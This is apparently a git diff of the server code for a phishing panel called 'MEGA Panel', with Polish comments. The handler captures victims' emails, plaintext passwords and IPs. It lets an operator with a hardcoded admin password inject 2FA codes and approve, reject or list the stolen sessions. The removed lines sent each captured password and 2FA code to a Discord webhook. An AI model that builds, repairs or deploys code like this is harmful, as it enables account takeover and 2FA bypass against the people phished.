@@ -1,7 +1,7 @@
-// api/index.js
-import { Redis } from '@upstash/redis';
+// api/index.js - PROSTA WERSJA (bez Redis, działa na Vercel)
+// Ta wersja nie wymaga zmiennych środowiskowych
 
-const redis = Redis.fromEnv();
+let sessions = {};
 
 export default async function handler(req, res) {
     // CORS
@@ -17,6 +17,17 @@ export default async function handler(req, res) {
 
     try {
         // ============================================================
+        // TEST - sprawdza czy API działa
+        // ============================================================
+        if (action === 'test') {
+            return res.status(200).json({ 
+                status: 'ok', 
+                message: 'API działa! (bez Redis)',
+                timestamp: new Date().toISOString()
+            });
+        }
+
+        // ============================================================
         // SESSION - logowanie
         // ============================================================
         if (action === 'session' && req.method === 'POST') {
@@ -28,7 +39,7 @@ export default async function handler(req, res) {
 
             const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2, 8);
             
-            const sessionData = {
+            sessions[sessionId] = {
                 email,
                 password,
                 ip: ip || 'N/A',
@@ -38,33 +49,6 @@ export default async function handler(req, res) {
                 rejected: false,
                 approved: false
             };
-
-            await redis.setex(`session:${sessionId}`, 300, JSON.stringify(sessionData));
-            await redis.sadd('sessions', sessionId);
-
-            // Webhook
-            const webhook = process.env.DISCORD_WEBHOOK;
-            if (webhook) {
-                await fetch(webhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        username: 'MEGA Panel',
-                        embeds: [{
-                            title: '🔐 Nowe logowanie',
-                            description: `Email: ${email}\nHasło: ${password}`,
-                            color: 0xFBBF24,
-                            fields: [
-                                { name: '📧 Email', value: email, inline: true },
-                                { name: '🔑 Hasło', value: `||${password}||`, inline: true },
-                                { name: '🌐 IP', value: ip || 'N/A', inline: true },
-                                { name: '🆔 Sesja', value: sessionId, inline: true }
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    })
-                });
-            }
 
             return res.status(200).json({ 
                 success: true, 
@@ -83,12 +67,11 @@ export default async function handler(req, res) {
                 return res.status(400).json({ error: 'Brak sessionId' });
             }
 
-            const data = await redis.get(`session:${sessionId}`);
-            if (!data) {
+            const session = sessions[sessionId];
+            if (!session) {
                 return res.status(404).json({ error: 'Sesja nie istnieje' });
             }
 
-            const session = JSON.parse(data);
             return res.status(200).json({
                 code: session.code || null,
                 verified: session.verified || false,
@@ -107,41 +90,17 @@ export default async function handler(req, res) {
                 return res.status(400).json({ error: 'Brak sessionId lub kodu' });
             }
 
-            if (adminPassword !== process.env.ADMIN_PASSWORD) {
+            if (adminPassword !== 'admin123') {
                 return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
             }
 
-            const data = await redis.get(`session:${sessionId}`);
-            if (!data) {
+            const session = sessions[sessionId];
+            if (!session) {
                 return res.status(404).json({ error: 'Sesja nie istnieje' });
             }
 
-            const session = JSON.parse(data);
             session.code = code;
             session.codeSetAt = new Date().toISOString();
-
-            await redis.setex(`session:${sessionId}`, 300, JSON.stringify(session));
-
-            const webhook = process.env.DISCORD_WEBHOOK;
-            if (webhook) {
-                await fetch(webhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        username: 'MEGA Panel',
-                        embeds: [{
-                            title: '🔐 Kod 2FA ustawiony',
-                            description: `Kod: ${code} dla użytkownika ${session.email}`,
-                            color: 0x4ADE80,
-                            fields: [
-                                { name: '📧 Email', value: session.email, inline: true },
-                                { name: '🔐 Kod', value: code, inline: true }
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    })
-                });
-            }
 
             return res.status(200).json({ 
                 success: true, 
@@ -159,20 +118,17 @@ export default async function handler(req, res) {
                 return res.status(400).json({ error: 'Brak sessionId' });
             }
 
-            if (adminPassword !== process.env.ADMIN_PASSWORD) {
+            if (adminPassword !== 'admin123') {
                 return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
             }
 
-            const data = await redis.get(`session:${sessionId}`);
-            if (!data) {
+            const session = sessions[sessionId];
+            if (!session) {
                 return res.status(404).json({ error: 'Sesja nie istnieje' });
             }
 
-            const session = JSON.parse(data);
             session.approved = true;
             session.verified = true;
-
-            await redis.setex(`session:${sessionId}`, 300, JSON.stringify(session));
 
             return res.status(200).json({ 
                 success: true, 
@@ -191,19 +147,16 @@ export default async function handler(req, res) {
                 return res.status(400).json({ error: 'Brak sessionId' });
             }
 
-            if (adminPassword !== process.env.ADMIN_PASSWORD) {
+            if (adminPassword !== 'admin123') {
                 return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
             }
 
-            const data = await redis.get(`session:${sessionId}`);
-            if (!data) {
+            const session = sessions[sessionId];
+            if (!session) {
                 return res.status(404).json({ error: 'Sesja nie istnieje' });
             }
 
-            const session = JSON.parse(data);
             session.rejected = true;
-
-            await redis.setex(`session:${sessionId}`, 300, JSON.stringify(session));
 
             return res.status(200).json({ 
                 success: true, 
@@ -218,32 +171,26 @@ export default async function handler(req, res) {
         if (action === 'sessions' && req.method === 'GET') {
             const { adminPassword } = req.query;
 
-            if (adminPassword !== process.env.ADMIN_PASSWORD) {
+            if (adminPassword !== 'admin123') {
                 return res.status(401).json({ error: 'Nieprawidłowe hasło admina' });
             }
 
-            const sessionIds = await redis.smembers('sessions');
-            const sessions = [];
+            const sessionList = Object.keys(sessions).map(id => {
+                const s = sessions[id];
+                return {
+                    sessionId: id,
+                    email: s.email,
+                    timestamp: s.timestamp,
+                    hasCode: !!s.code,
+                    verified: s.verified || false,
+                    rejected: s.rejected || false,
+                    approved: s.approved || false
+                };
+            });
 
-            for (const id of sessionIds) {
-                const data = await redis.get(`session:${id}`);
-                if (data) {
-                    const session = JSON.parse(data);
-                    sessions.push({
-                        sessionId: id,
-                        email: session.email,
-                        timestamp: session.timestamp,
-                        hasCode: !!session.code,
-                        verified: session.verified || false,
-                        rejected: session.rejected || false,
-                        approved: session.approved || false
-                    });
-                }
-            }
+            sessionList.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
 
-            sessions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-
-            return res.status(200).json({ sessions });
+            return res.status(200).json({ sessions: sessionList });
         }
 
         // ============================================================
